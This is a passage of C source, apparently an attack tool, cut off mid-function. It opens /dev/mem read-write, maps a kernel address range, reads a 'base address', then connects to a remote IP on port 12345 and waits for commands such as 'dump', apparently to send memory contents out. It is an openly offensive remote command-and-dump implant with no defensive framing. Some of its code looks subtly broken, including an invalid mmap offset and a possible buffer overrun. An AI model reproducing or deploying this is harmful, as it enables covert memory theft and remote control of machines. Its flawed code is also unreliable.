#include <stdio.h>

#include <stdlib.h>

#include <string.h>

#include <fcntl.h>

#include <sys/mman.h>

#include <sys/stat.h>

#include <sys/types.h>

#include <unistd.h>

#include <arpa/inet.h>

#include <sys/socket.h>

#include <netinet/in.h>

#include <netdb.h>

#define ADDR_EFI_MEM 0xffffffff80000000ull

#define MAP_SIZE (1024*1024)

static int sock;

static uint8_t *mem;

static uint64_t read_qword(uint64_t addr)

{

return *(uint64_t *)(mem + (addr - ADDR_EFI_MEM));

}

static void write_qword(uint64_t addr, uint64_t value)

{

*(uint64_t *)(mem + (addr - ADDR_EFI_MEM)) = value;

}

static void usage(char *progname)

{

printf("Usage: %s target_ip\n", progname);

exit(EXIT_FAILURE);

}

static int connect_to_server(char *ip)

{

int sockfd;

struct sockaddr_in server;

sockfd = socket(AF_INET, SOCK_STREAM, 0);

if (sockfd < 0) {

perror("socket");

return -1;

}

memset(&server, 0, sizeof(server));

server.sin_family = AF_INET;

server.sin_addr.s_addr = inet_addr(ip);

server.sin_port = htons(12345);

if (connect(sockfd, (struct sockaddr *)&server, sizeof(server)) < 0) {

perror("connect");

return -1;

}

return sockfd;

}

int main(int argc, char *argv[])

{

uint64_t base_addr;

char *target_ip;

struct stat st;

int fd;

if (argc != 2)

usage(argv[0]);

target_ip = argv[1];

fd = open("/dev/mem", O_RDWR);

if (fd < 0) {

perror("open");

return -1;

}

if (fstat(fd, &st) < 0) {

perror("fstat");

return -1;

}

mem = mmap(NULL, MAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, ADDR_EFI_MEM);

if (mem == MAP_FAILED) {

perror("mmap");

return -1;

}

base_addr = read_qword(0xffffffff82f65600ull);

printf("[+] Found base address: 0x%llx\n", base_addr);

sock = connect_to_server(target_ip);

if (sock < 0)

return -1;

printf("[+] Connected to %s\n", target_ip);

while (1) {

char buf[1024];

int n = recv(sock, buf, sizeof(buf), 0);

if (n <= 0) {

printf("[-] Connection closed\n");

break;

}

buf[n] = '\0';

printf("[+] Received command: %s\n", buf);

if (strcmp(buf, "exit") == 0) {

break;

} else if (strcmp(buf, "dump") == 0) {

char filename[256];

uint64_t addr, size;

int fd;

ssize_t n;

n = recv(sock, filename, sizeof(filename), 0);

if (n <= 0)

break

